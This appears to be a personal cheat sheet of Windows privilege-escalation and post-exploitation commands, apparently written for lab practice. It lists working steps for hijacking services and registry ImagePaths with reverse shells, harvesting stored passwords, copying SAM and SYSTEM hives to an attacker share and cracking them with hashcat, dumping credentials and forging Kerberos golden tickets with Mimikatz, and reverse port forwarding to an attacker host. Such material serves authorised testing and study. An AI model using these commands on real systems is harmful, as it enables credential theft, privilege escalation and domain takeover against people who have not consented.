SERVICE EXPLOITS

#################################### INSECURE SERVICE PERMISSIONS ####################################
USEFUL PERMISSIONS: SERVICE_STOP/START, SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS.
RABBIT HOLE: if we can change service config, but cannot stop/start service.
ENUMERATION INFO: .\winpeasany.exe quiet servicesinfo
ANALYSIS WINPEAS OUTPUT: modifiable services; VERIFICATION: .\accesscheck.exe /accepteula -uwcqv [servicename]
SERVICE CONFIGURATION INFO: sc qc [servicename]
STATE OF THE SERVICE: sc query [servicename]
SET SERVICE 'BINARY_PATH' TO REVERSE SHELL PAYLOAD: sc config [servicename] binpath="\"PATH_TO_REVERSE_SHELL\""
START/STOP SERVICE: net start/stop [servicename]

#################################### UNQUOTED SERVICE PATH ###########################################
Executables in windows can be run without using their extension (e.g. "whoami.exe" can be run "whoami").
Some executables take arguments separated by spaces.
EXAMPLE: C:\Program Files\Some Dir\SomeProgram.exe, in this example "C:\Program" and "C:\Program Files\Some" can be the executable.
WINPEAS OUTPUT ENUMERATION: No quotes and Spaces detected.
VERIFICATION: .\accesscheck.exe /accepteula -ucqv user [servicename]
CHECK FOR WRITE PERMISSIONS IN SERVICE PATH: .\accesscheck.exe /accepteula -uwdq C:\, "C:\Program Files\" (RW BUILTIN\Users)
EXPLOITATION: replace part of dir name with reverse shell and start the service. cope reverseshell.exe "UNQUOTED PATH".

#################################### WEAK REGISTRY PERMISSIONS ########################################
The Windows registry stores entries for each service. We can modify a service's configuration even if we cannot modify the service directly.
ANALYSIS WINPEAS OUTPUT: modify registry of a service.
VERIFICATION WITH POWERSHELL:
- powershell -exec bypass
- Get-Acl HKLM\...\[registry service name] | Format-List
VERIFICATION WITH ACCESSCHECK: .\accesscheck.exe /accepteula -uvwqk HKLM\...\[registry service name].
REGISTRY INFO: reg query HKLM\...\[registry service name]
OVERWRITE ERVICE IMAGEPATH BINARIES: reg add HKLM\...\[registry service name] /v ImagePath /t REG_EXPAND_SZ /d C:\path_to_reverseshell.exe /f.
START THE SERVICE.

#################################### INSECURE SERVICE EXECUTABLES ######################################
ANALYSIS WINPEAS OUTPUT: file permission service
EXPLOITATION: replace file with reverseshell.exe and start service.

#################################### DLL HIJACKING #####################################################
FIND DLL SERVICE, CHECK PERMISSIONS (START/STOP), COPY SERVICE THAT HAVE DLL ON LOCAL HOST AND ANALYZE WITH procmon, we need find file with result NAME_NOT_FOUND.
GENERATE REVERSE SHELL, TRANSFER ON WINDOWS MACHINE, PLACE IN DIR WHERE SERVICE SEARCH DLL, START SERVICE.
------------------------------------------------------------------------------------------------------------------------------------------------------------------

REGISTRY

#################################### AUTORUNS #####################################################
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.
.\accesscheck.exe /accespeula -wvu "[program name from reg query]".
copy /Y reverseshell.exe "PATH TO PROGRAM".
RESTART WINDOWS.

#################################### ALLWAYSINSTALLELEVATED #####################################################

THE AllwaysInstallElevated registry MUST set to 1 for both the local machine and current user.
WINPEAS: .\winpeasany.exe quiet windowscreds.
MANUALLY VERIFY: reg query [registry].
CREATE REVERSE MSI FILE.
RUN MSI: msiexec /quiet /qn /i /reverseshell.msi

#################################### PASSWORDS ##################################################################
reg query HKLM /f password /t REG_SZ /s = local machine
reg query HKCU /f password /t REG_SZ /s = local user

FROM LINUX: winexe -U 'user%password' //[IP] cmd.exe, winexe -U 'user%password' --system //[IP] cmd.exe

#################################### SAVES CREDS ################################################################
WINPEAS: ./winpeasany.exe quiet cmd windowscreds
VERIFY: cmdkey /list
EXPLOITATION: runas /savecred /user:admin C:\reverseshell.exe

#################################### CONFIGURATION FILES ########################################################
Recursively search for files in the current directory with "pass" in the name, or ending in ".config": dir /s *pass* == *.config
Resursively search for files in the current directory that contain the word "password" and also end in either .xml, .ini, or .txt: findstr /si password *.xml *ini *.txt
WINPEAS: .\winpeasany.exe quiet cmd searchfast filesinfo.
INTERESTING FILES: Unattend.xml

#################################### SAM ########################################################################
Windows stores password hashes in the Security Account Manager. The hashes are encrypted with a key which can be found in a file names SYSTEM.
If we have the ability to read the SAM and SYSTEM files, we can extract the hashes.
The SAM and SYSTEM files are located in the C:\Windows\System32\config directory. Yhe files are locked while Windows is running.
Backups may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories.
CREDDUMP7: https://github.com/CiscoCXSecurity/creddump7.git
CREDDUMP7 USAGE: python2 pwdump.py /SYSTEM /SAM (LM hash deprecated, NTLM hash which starts with 31d6 = empty string or disabled).

THM:
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt

#################################### PASS THE HASH ##############################################################
pth-winexe, evil-winrm, psexec, wmiexec, crackmapexec.
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

STARTUP APPS

.\accescheck.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Start"
CREATE VBS script.
RUN SCRIPT: cscript [script name].
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

TOKEN IMPERSONATION PRIVILEGES: 
- SeImpersonate
- SeAssignPrimaryToken
- SeAssignPrimaryPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeTakeOwnershipPrivilege
- SeTcbPrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeDubugPrivilege

TOKEN IMPERSONATION WITH INCOGNITO:
load incognito
list_tokens -u/g
impersonate_token domain\\user
rev2self
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

MIMIKATZ/KIWI

CREDENTIAL DUMP
privilege::debug
sekurlsa::logonpassword => show to us stored hashes in computer memory.
lsadump::sam, lsadump::sam /patch => dump SAM.
lsadump::lsa /patch => dump RID, User, NTLM hash.

GOLDEN TICKET ATTACK
Have access to entire domain.
privilege::debug
lsadump::lsa /inject /name:krbtgt //save DOMAIN SID AND NTLM HASH.
kerberos:golden /User:Administrator /domain:[domain name] /sid:[DOMAIN SID] /krbtgt:[krbtgt NTLM] /id:500 /ptt
misc::cmd

psexec.exe \\COMPUTER NAME cmd.exe
Persistance method

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

ABUSING GPP
VULNERABLE FILE: Groups.xml in SYSVOL. (parameter cpassword)
ON MSDN GET KEY.
gpp-decrypt [valuse from cpassword]

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

PORT FORWARDIND
EXAMPLE WITH PORT 445: .\plink.exe root@[ATTAKER IP] -R 445:127.0.0.1:445

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
ENUMERATION, PRIVILEGE ESCALATION STRATEGY:
1) Check user and group: whoami, whoami /priv, net user [username]
2) Run winPEAS with fast, searchfast and cmd options.
3) Run Seatbelt and other scripts.
4) Enumerate with manual checks: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
5) Persistence: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

AV ENUMERATION

VIEW WINDOWS DEFENDER STATE: sc query windefender.
VIEW ALL RUNNIMG SERVICE (ENUM ANTI-VIRUS): sc queryx type= service.
FIREWALL SETTINGS: 
- netsh advfirewall firewall dump 
- netsh firewall show state
- netsh firewall show config









